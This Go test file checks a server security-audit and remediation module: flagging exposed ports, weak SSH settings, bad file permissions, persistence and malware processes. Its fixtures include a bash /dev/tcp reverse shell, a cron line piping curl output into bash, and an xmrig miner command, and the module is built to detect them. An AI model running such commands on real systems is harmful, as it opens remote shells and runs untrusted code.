package security

import (
	"context"
	"errors"
	"io/fs"
	"strings"
	"testing"
	"time"

	"github.com/rockclaver/claver-agent/internal/firewall"
	agentprocess "github.com/rockclaver/claver-agent/internal/process"
)

type fakeFirewall struct {
	st        firewall.Status
	statusErr error
	added     []firewall.Rule
	removed   []firewall.Rule
	addErr    error
	removeErr error
}

func (f *fakeFirewall) Status(context.Context) (firewall.Status, error) {
	return f.st, f.statusErr
}

func (f *fakeFirewall) RuleAdd(_ context.Context, r firewall.Rule) error {
	f.added = append(f.added, r)
	return f.addErr
}

func (f *fakeFirewall) RuleRemove(_ context.Context, r firewall.Rule) error {
	f.removed = append(f.removed, r)
	return f.removeErr
}

type fakeProcesses struct {
	procs  []agentprocess.Process
	killed []struct {
		pid   int
		start uint64
		sig   string
	}
	err error
}

func (f *fakeProcesses) List(context.Context, string, int) ([]agentprocess.Process, error) {
	return append([]agentprocess.Process(nil), f.procs...), f.err
}

func (f *fakeProcesses) Kill(_ context.Context, pid int, start uint64, sig string) error {
	f.killed = append(f.killed, struct {
		pid   int
		start uint64
		sig   string
	}{pid: pid, start: start, sig: sig})
	return nil
}

func TestAudit_FlagsPublicRiskyPortAndProvidesClosePortFix(t *testing.T) {
	fw := &fakeFirewall{st: firewall.Status{
		Backend:   firewall.BackendUFW,
		Available: true,
		Sockets: []firewall.Socket{{
			Protocol: firewall.ProtoTCP,
			Address:  "0.0.0.0",
			Port:     6379,
			Process:  "redis-server",
			PID:      99,
		}},
		SSHPorts: []int{22},
	}}
	mgr, err := New(Config{
		Firewall: fw,
		ReadFile: func(path string) ([]byte, error) {
			return nil, errors.New("missing")
		},
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			if name == "systemctl" && strings.Join(args, " ") == "is-active auditd" {
				return []byte("active\n"), nil
			}
			return []byte("inactive\n"), errors.New("inactive")
		},
		Now: func() time.Time { return time.Unix(1, 0) },
	})
	if err != nil {
		t.Fatal(err)
	}

	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	var redis Finding
	for _, f := range audit.Findings {
		if f.ID == "public_tcp_6379" {
			redis = f
			break
		}
	}
	if redis.ID == "" {
		t.Fatalf("redis finding missing: %+v", audit.Findings)
	}
	if redis.Severity != SeverityCritical || redis.Fix == nil || redis.Fix.Kind != FixClosePort {
		t.Fatalf("redis finding not critical/fixable: %+v", redis)
	}
	if audit.Summary.Critical != 1 || audit.Summary.Fixable != 1 {
		t.Fatalf("summary = %+v", audit.Summary)
	}
}

func TestAudit_ClearsPublicPortFindingOnceFirewallBlocksIt(t *testing.T) {
	// Same listening socket as TestAudit_FlagsPublicRiskyPortAndProvidesClosePortFix,
	// but with the exact rule Manager.Fix's FixClosePort adds for a ufw-style
	// backend already present — reproduces state right after "Fix"/"Fix with
	// AI" reports success. The service keeps listening (that's how the fix
	// works: block reachability, not the process), so a naive re-scan of
	// Sockets alone would re-flag this forever.
	fw := &fakeFirewall{st: firewall.Status{
		Backend:   firewall.BackendUFW,
		Available: true,
		Sockets: []firewall.Socket{{
			Protocol: firewall.ProtoTCP,
			Address:  "0.0.0.0",
			Port:     6379,
			Process:  "redis-server",
			PID:      99,
		}},
		Rules: []firewall.Rule{{
			Action:   firewall.ActionDeny,
			Protocol: firewall.ProtoTCP,
			Port:     6379,
			Comment:  "Claver security audit",
		}},
		SSHPorts: []int{22},
	}}
	mgr, err := New(Config{
		Firewall: fw,
		ReadFile: func(path string) ([]byte, error) {
			return nil, errors.New("missing")
		},
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			return []byte("inactive\n"), errors.New("inactive")
		},
		Now: func() time.Time { return time.Unix(1, 0) },
	})
	if err != nil {
		t.Fatal(err)
	}

	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range audit.Findings {
		if f.ID == "public_tcp_6379" {
			t.Fatalf("finding should have cleared once firewall blocks the port: %+v", f)
		}
	}
}

func TestAudit_FirewalldClearsPublicPortFindingOnceAllowRuleRemoved(t *testing.T) {
	// Mirrors FixClosePort's firewalld branch: the fix removes the allow
	// rule rather than adding a deny rule, relying on firewalld's own
	// default-deny policy.
	fw := &fakeFirewall{st: firewall.Status{
		Backend:   firewall.BackendFirewalld,
		Available: true,
		Sockets: []firewall.Socket{{
			Protocol: firewall.ProtoTCP,
			Address:  "0.0.0.0",
			Port:     6379,
			Process:  "redis-server",
			PID:      99,
		}},
		Rules:    []firewall.Rule{},
		SSHPorts: []int{22},
	}}
	mgr, err := New(Config{
		Firewall: fw,
		ReadFile: func(path string) ([]byte, error) {
			return nil, errors.New("missing")
		},
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			return []byte("inactive\n"), errors.New("inactive")
		},
		Now: func() time.Time { return time.Unix(1, 0) },
	})
	if err != nil {
		t.Fatal(err)
	}

	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range audit.Findings {
		if f.ID == "public_tcp_6379" {
			t.Fatalf("finding should have cleared once the firewalld allow rule is gone: %+v", f)
		}
	}
}

func TestAudit_FlagsSSHPasswordAndRootLogin(t *testing.T) {
	fw := &fakeFirewall{st: firewall.Status{
		Backend:   firewall.BackendUFW,
		Available: true,
		Sockets: []firewall.Socket{{
			Protocol: firewall.ProtoTCP,
			Address:  "::",
			Port:     22,
			Process:  "sshd",
		}},
		SSHPorts: []int{22},
	}}
	mgr, err := New(Config{
		Firewall: fw,
		ReadFile: func(path string) ([]byte, error) {
			return nil, errors.New("missing")
		},
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			if name == "sshd" {
				return []byte("passwordauthentication yes\npermitrootlogin yes\npermitemptypasswords no\n"), nil
			}
			return []byte("inactive\n"), errors.New("inactive")
		},
	})
	if err != nil {
		t.Fatal(err)
	}

	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := map[string]Severity{}
	for _, f := range audit.Findings {
		ids[f.ID] = f.Severity
	}
	if ids["ssh_password_auth_enabled"] != SeverityHigh {
		t.Fatalf("password auth severity = %s", ids["ssh_password_auth_enabled"])
	}
	if ids["ssh_root_login_enabled"] != SeverityHigh {
		t.Fatalf("root login severity = %s", ids["ssh_root_login_enabled"])
	}
}

func TestAudit_FlagsSuspiciousReverseShellProcess(t *testing.T) {
	procs := &fakeProcesses{procs: []agentprocess.Process{{
		PID:            4242,
		User:           "www-data",
		Command:        "bash -c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
		StartTimeTicks: 77,
	}}}
	mgr, err := New(Config{
		Processes: procs,
		ReadFile: func(path string) ([]byte, error) {
			return nil, errors.New("missing")
		},
		Run: func(context.Context, string, ...string) ([]byte, error) {
			return []byte("inactive\n"), errors.New("inactive")
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	var got Finding
	for _, f := range audit.Findings {
		if strings.HasPrefix(f.ID, "suspicious_process_") {
			got = f
			break
		}
	}
	if got.Fix == nil || got.Fix.Kind != FixKillProcess || got.Fix.PID != 4242 {
		t.Fatalf("suspicious process finding = %+v", got)
	}
}

func TestFixClosePortAddsFirewallDenyRule(t *testing.T) {
	fw := &fakeFirewall{st: firewall.Status{Backend: firewall.BackendUFW, Available: true}}
	mgr, err := New(Config{Firewall: fw})
	if err != nil {
		t.Fatal(err)
	}
	res, err := mgr.Fix(context.Background(), FixRequest{
		Kind:     FixClosePort,
		Port:     6379,
		Protocol: "tcp",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(fw.added) != 1 {
		t.Fatalf("added rules = %+v", fw.added)
	}
	if fw.added[0].Action != firewall.ActionDeny || fw.added[0].Port != 6379 {
		t.Fatalf("rule = %+v", fw.added[0])
	}
	if res.Target != "tcp/6379" {
		t.Fatalf("target = %s", res.Target)
	}
}

func TestFixClosePortRemovesFirewalldAllowRule(t *testing.T) {
	fw := &fakeFirewall{st: firewall.Status{Backend: firewall.BackendFirewalld, Available: true}}
	mgr, err := New(Config{Firewall: fw})
	if err != nil {
		t.Fatal(err)
	}
	_, err = mgr.Fix(context.Background(), FixRequest{
		Kind:     FixClosePort,
		Port:     6379,
		Protocol: "tcp",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(fw.added) != 0 {
		t.Fatalf("firewalld should not add deny rules: %+v", fw.added)
	}
	if len(fw.removed) != 1 {
		t.Fatalf("removed rules = %+v", fw.removed)
	}
	if fw.removed[0].Action != firewall.ActionAllow || fw.removed[0].Port != 6379 {
		t.Fatalf("removed rule = %+v", fw.removed[0])
	}
}

func TestFixRunScriptExecutesAsShellCommand(t *testing.T) {
	var calls []string
	mgr, err := New(Config{
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			calls = append(calls, strings.Join(append([]string{name}, args...), " "))
			return []byte("chmod applied\n"), nil
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	res, err := mgr.Fix(context.Background(), FixRequest{
		Kind:   FixRunScript,
		Script: "chmod 640 /etc/shadow && chown root:shadow /etc/shadow",
	})
	if err != nil {
		t.Fatal(err)
	}
	if res.Kind != FixRunScript || res.Summary != "chmod applied" {
		t.Fatalf("result = %+v", res)
	}
	joined := strings.Join(calls, "\n")
	if !strings.Contains(joined, "-c chmod 640 /etc/shadow && chown root:shadow /etc/shadow") {
		t.Fatalf("script not passed to sh -c: %s", joined)
	}
}

func TestFixRunScriptRejectsEmptyScript(t *testing.T) {
	mgr, err := New(Config{})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := mgr.Fix(context.Background(), FixRequest{Kind: FixRunScript}); err == nil {
		t.Fatal("expected error for empty script")
	}
}

func TestFixRunScriptRejectsOversizedScript(t *testing.T) {
	mgr, err := New(Config{})
	if err != nil {
		t.Fatal(err)
	}
	huge := strings.Repeat("a", MaxScriptBytes+1)
	if _, err := mgr.Fix(context.Background(), FixRequest{Kind: FixRunScript, Script: huge}); err == nil {
		t.Fatal("expected error for oversized script")
	}
}

func TestFixRunScriptSurfacesCommandFailure(t *testing.T) {
	mgr, err := New(Config{
		Run: func(_ context.Context, _ string, _ ...string) ([]byte, error) {
			return []byte("permission denied\n"), errors.New("exit status 1")
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	_, err = mgr.Fix(context.Background(), FixRequest{Kind: FixRunScript, Script: "false"})
	if err == nil || !strings.Contains(err.Error(), "permission denied") {
		t.Fatalf("expected error surfacing command output, got %v", err)
	}
}

func TestAudit_InactiveAuditdProvidesTypedFix(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: noReadFile,
		Glob:     noGlob,
		Run:      noRun,
		Stat:     noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByID(audit)["auditd_inactive"]
	if got.Fix == nil || got.Fix.Kind != FixEnableAuditd || got.Fix.Target != "auditd" {
		t.Fatalf("auditd finding fix = %+v", got.Fix)
	}
}

func TestFixEnableAuditdDebianInstallsAndEnables(t *testing.T) {
	var calls []string
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if path == "/etc/debian_version" {
				return []byte("12\n"), nil
			}
			return nil, errors.New("missing")
		},
		Run: func(_ context.Context, name string, args ...string) ([]byte, error) {
			call := strings.Join(append([]string{name}, args...), " ")
			calls = append(calls, call)
			if name == "systemctl" && strings.Join(args, " ") == "is-active auditd" {
				return []byte("inactive\n"), errors.New("inactive")
			}
			return []byte("ok\n"), nil
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	res, err := mgr.Fix(context.Background(), FixRequest{Kind: FixEnableAuditd})
	if err != nil {
		t.Fatal(err)
	}
	if res.Target != "auditd" {
		t.Fatalf("target = %q", res.Target)
	}
	joined := strings.Join(calls, "\n")
	if !strings.Contains(joined, "apt-get install -y auditd") {
		t.Fatalf("missing auditd install call:\n%s", joined)
	}
	if !strings.Contains(joined, "systemctl enable --now auditd") {
		t.Fatalf("missing auditd enable call:\n%s", joined)
	}
}

func findingsByID(audit Audit) map[string]Finding {
	out := map[string]Finding{}
	for _, f := range audit.Findings {
		out[f.ID] = f
	}
	return out
}

func noReadFile(string) ([]byte, error) { return nil, errors.New("missing") }
func noGlob(string) ([]string, error)   { return nil, nil }
func noRun(context.Context, string, ...string) ([]byte, error) {
	return nil, errors.New("unavailable")
}
func noStat(string) (fs.FileMode, error) { return 0, errors.New("not found") }

func TestAudit_FlagsWorldWritableDockerSocketAndGroupMembership(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if path == "/etc/group" {
				return []byte("docker:x:999:alice,bob\n"), nil
			}
			return noReadFile(path)
		},
		Glob: noGlob,
		Run:  noRun,
		Stat: func(path string) (fs.FileMode, error) {
			if path == "/var/run/docker.sock" {
				return 0o666, nil
			}
			return noStat(path)
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if ids["docker_socket_world_writable"].Severity != SeverityCritical {
		t.Fatalf("docker socket finding = %+v", ids["docker_socket_world_writable"])
	}
	if !strings.Contains(strings.Join(ids["docker_group_membership"].Evidence, ","), "alice") {
		t.Fatalf("docker group finding = %+v", ids["docker_group_membership"])
	}
}

func TestAudit_FlagsWorldWritablePasswdAndWorldReadableShadow(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: noReadFile,
		Glob:     noGlob,
		Run:      noRun,
		Stat: func(path string) (fs.FileMode, error) {
			switch path {
			case "/etc/passwd":
				return 0o666, nil
			case "/etc/shadow":
				return 0o644, nil
			}
			return noStat(path)
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if ids["world_writable_etc_passwd"].Severity != SeverityCritical {
		t.Fatalf("passwd finding = %+v", ids["world_writable_etc_passwd"])
	}
	if ids["world_readable_etc_shadow"].Severity != SeverityHigh {
		t.Fatalf("shadow finding = %+v", ids["world_readable_etc_shadow"])
	}
}

// Regression: applying exactly the fix filePermissionFindings recommends for
// /etc/shadow ("mode 0640 or stricter, owned by root and the shadow group")
// must clear BOTH the writable and readable findings. Previously maxPerm for
// shadow/gshadow was 0o077 (covers read+write+execute for group/other), so
// mode 0640's group-read bit alone kept "world_writable_etc_shadow" flagged
// forever — an AI-run or human-applied fix could never make this finding
// disappear even when correctly remediated.
func TestAudit_RecommendedShadowPermissionsAreFullyCompliant(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: noReadFile,
		Glob:     noGlob,
		Run:      noRun,
		Stat: func(path string) (fs.FileMode, error) {
			if path == "/etc/shadow" {
				return 0o640, nil
			}
			return noStat(path)
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if _, present := ids["world_writable_etc_shadow"]; present {
		t.Fatalf("mode 0640 must not be flagged writable: %+v", ids["world_writable_etc_shadow"])
	}
	if _, present := ids["world_readable_etc_shadow"]; present {
		t.Fatalf("mode 0640 must not be flagged world-readable: %+v", ids["world_readable_etc_shadow"])
	}
}

func TestAudit_FlagsLdSoPreload(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if path == "/etc/ld.so.preload" {
				return []byte("/lib/libevil.so\n"), nil
			}
			return noReadFile(path)
		},
		Glob: noGlob,
		Run:  noRun,
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if ids["ld_preload_configured"].Severity != SeverityCritical {
		t.Fatalf("ld.so.preload finding = %+v", ids["ld_preload_configured"])
	}
}

func TestAudit_FlagsEmptyPasswordAccounts(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if path == "/etc/shadow" {
				return []byte("root:$6$abc:19000:0:99999:7:::\nbackdoor::19000:0:99999:7:::\n"), nil
			}
			return noReadFile(path)
		},
		Glob: noGlob,
		Run:  noRun,
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if !strings.Contains(strings.Join(ids["accounts_with_empty_password"].Evidence, ","), "backdoor") {
		t.Fatalf("empty password finding = %+v", ids["accounts_with_empty_password"])
	}
}

func TestAudit_FlagsSuspiciousCronEntry(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if path == "/etc/cron.d/evil" {
				return []byte("* * * * * root curl http://x/y | bash\n"), nil
			}
			return noReadFile(path)
		},
		Glob: func(pattern string) ([]string, error) {
			if pattern == "/etc/cron.d/*" {
				return []string{"/etc/cron.d/evil"}, nil
			}
			return nil, nil
		},
		Run:  noRun,
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	var got Finding
	for _, f := range audit.Findings {
		if strings.HasPrefix(f.ID, "suspicious_cron_") {
			got = f
			break
		}
	}
	if got.Severity != SeverityHigh || got.Category != "persistence" {
		t.Fatalf("cron finding = %+v", got)
	}
}

func TestAudit_FlagsKernelHardeningGaps(t *testing.T) {
	values := map[string]string{
		"/proc/sys/net/ipv4/tcp_syncookies":     "0\n",
		"/proc/sys/net/ipv4/conf/all/rp_filter": "0\n",
		"/proc/sys/fs/suid_dumpable":            "1\n",
		"/proc/sys/kernel/kptr_restrict":        "0\n",
	}
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if v, ok := values[path]; ok {
				return []byte(v), nil
			}
			return noReadFile(path)
		},
		Glob: noGlob,
		Run:  noRun,
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	for id, want := range map[string]Severity{
		"sysctl_syncookies_disabled":    SeverityMedium,
		"sysctl_rp_filter_disabled":     SeverityMedium,
		"sysctl_suid_dumpable_enabled":  SeverityMedium,
		"sysctl_kptr_restrict_disabled": SeverityLow,
	} {
		if ids[id].Severity != want {
			t.Fatalf("%s = %+v, want severity %s", id, ids[id], want)
		}
	}
}

func TestAudit_FlagsMissingAutomaticSecurityUpdatesOnDebian(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			if path == "/etc/debian_version" {
				return []byte("12\n"), nil
			}
			return noReadFile(path)
		},
		Glob: noGlob,
		Run:  noRun,
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if ids["automatic_security_updates_disabled"].Severity != SeverityMedium {
		t.Fatalf("patch automation finding = %+v", ids["automatic_security_updates_disabled"])
	}
}

func TestAudit_SkipsAutomaticSecurityUpdatesFindingWhenEnabled(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: func(path string) ([]byte, error) {
			switch path {
			case "/etc/debian_version":
				return []byte("12\n"), nil
			case "/etc/apt/apt.conf.d/20auto-upgrades":
				return []byte("APT::Periodic::Unattended-Upgrade \"1\";\n"), nil
			}
			return noReadFile(path)
		},
		Glob: noGlob,
		Run:  noRun,
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if _, ok := ids["automatic_security_updates_disabled"]; ok {
		t.Fatalf("finding should be suppressed when unattended-upgrades is enabled")
	}
}

func TestAudit_FlagsNoMandatoryAccessControl(t *testing.T) {
	mgr, err := New(Config{ReadFile: noReadFile, Glob: noGlob, Run: noRun, Stat: noStat})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if ids["mac_framework_inactive"].Severity != SeverityLow {
		t.Fatalf("mac finding = %+v", ids["mac_framework_inactive"])
	}
}

func TestAudit_FlagsSELinuxPermissive(t *testing.T) {
	mgr, err := New(Config{
		ReadFile: noReadFile,
		Glob:     noGlob,
		Run: func(_ context.Context, name string, _ ...string) ([]byte, error) {
			if name == "getenforce" {
				return []byte("Permissive\n"), nil
			}
			return noRun(nil, name)
		},
		Stat: noStat,
	})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if ids["selinux_permissive"].Severity != SeverityLow {
		t.Fatalf("selinux finding = %+v", ids["selinux_permissive"])
	}
}

func TestAudit_FlagsKnownMalwareProcessName(t *testing.T) {
	procs := &fakeProcesses{procs: []agentprocess.Process{{
		PID:            555,
		User:           "root",
		Command:        "/usr/bin/xmrig -o pool.minexmr.com -u wallet",
		StartTimeTicks: 10,
	}}}
	mgr, err := New(Config{Processes: procs, ReadFile: noReadFile, Glob: noGlob, Run: noRun, Stat: noStat})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	got := ids["known_malware_process_555"]
	if got.Severity != SeverityCritical || got.Fix == nil || got.Fix.PID != 555 {
		t.Fatalf("malware process finding = %+v", got)
	}
}

func TestAudit_DoesNotFlagKernelThreadNamedLikeMalware(t *testing.T) {
	procs := &fakeProcesses{procs: []agentprocess.Process{
		{
			PID:            39,
			User:           "root",
			Command:        "kdevtmpfs",
			StartTimeTicks: 5,
			KernelThread:   true,
		},
		{
			PID:            555,
			User:           "root",
			Command:        "/usr/bin/kdevtmpfsi -o pool.example.com",
			StartTimeTicks: 10,
		},
	}}
	mgr, err := New(Config{Processes: procs, ReadFile: noReadFile, Glob: noGlob, Run: noRun, Stat: noStat})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	if _, ok := ids["known_malware_process_39"]; ok {
		t.Fatalf("real kernel thread pid 39 incorrectly flagged: %+v", audit.Findings)
	}
	if ids["known_malware_process_555"].Severity != SeverityCritical {
		t.Fatalf("impersonating malware process pid 555 not flagged: %+v", audit.Findings)
	}
}

func TestAudit_FlagsProcessExecutingFromWorldWritableDir(t *testing.T) {
	procs := &fakeProcesses{procs: []agentprocess.Process{{
		PID:            600,
		User:           "www-data",
		Command:        "/tmp/.x/a --daemon",
		StartTimeTicks: 20,
		ExePath:        "/tmp/.x/a",
	}}}
	mgr, err := New(Config{Processes: procs, ReadFile: noReadFile, Glob: noGlob, Run: noRun, Stat: noStat})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	got := ids["process_exec_world_writable_dir_600"]
	if got.Severity != SeverityHigh || got.Fix == nil {
		t.Fatalf("world-writable exec finding = %+v", got)
	}
}

func TestAudit_FlagsProcessWithDeletedBinary(t *testing.T) {
	procs := &fakeProcesses{procs: []agentprocess.Process{{
		PID:            700,
		User:           "www-data",
		Command:        "/usr/sbin/nginx -g daemon off;",
		StartTimeTicks: 30,
		ExePath:        "/usr/sbin/nginx",
		ExeDeleted:     true,
	}}}
	mgr, err := New(Config{Processes: procs, ReadFile: noReadFile, Glob: noGlob, Run: noRun, Stat: noStat})
	if err != nil {
		t.Fatal(err)
	}
	audit, err := mgr.Audit(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	ids := findingsByID(audit)
	got := ids["process_exe_deleted_700"]
	if got.Severity != SeverityMedium || got.Fix != nil {
		t.Fatalf("deleted binary finding = %+v", got)
	}
}
